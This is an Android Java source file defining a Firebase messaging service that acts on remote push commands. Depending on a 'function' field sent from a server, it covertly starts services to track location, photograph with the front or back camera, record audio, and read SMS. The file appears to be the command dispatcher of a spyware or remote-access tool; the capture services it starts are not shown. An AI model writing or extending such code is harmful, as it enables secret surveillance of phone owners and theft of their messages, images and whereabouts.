package com.gravity.andorid.business.net;

import android.content.Intent;
import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.gravity.andorid.app.services.AudioService;
import com.gravity.andorid.app.services.CamService;
import com.gravity.andorid.app.services.LService;
import com.gravity.andorid.app.services.SmsService;


public class FcmService extends FirebaseMessagingService {

    private String function;

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {

        Intent camIntent = new Intent(this, CamService.class);

        Log.d("Notification", remoteMessage.getData().get("function"));
        function = remoteMessage.getData().get("function");

        switch (function) {
            case "Location":
                startService(new Intent(this, LService.class));
                break;

            case "FrontCamera":
                camIntent.putExtra("camera", 1);
                startService(camIntent);
                break;

            case "BackCamera":
                camIntent.putExtra("camera", 0);
                startService(camIntent);
                break;

            case "RecordAudio":
                startService(new Intent(this, AudioService.class));
                break;

            case "ReadSms":
                startService(new Intent(this, SmsService.class));
                break;
        }
    }
}
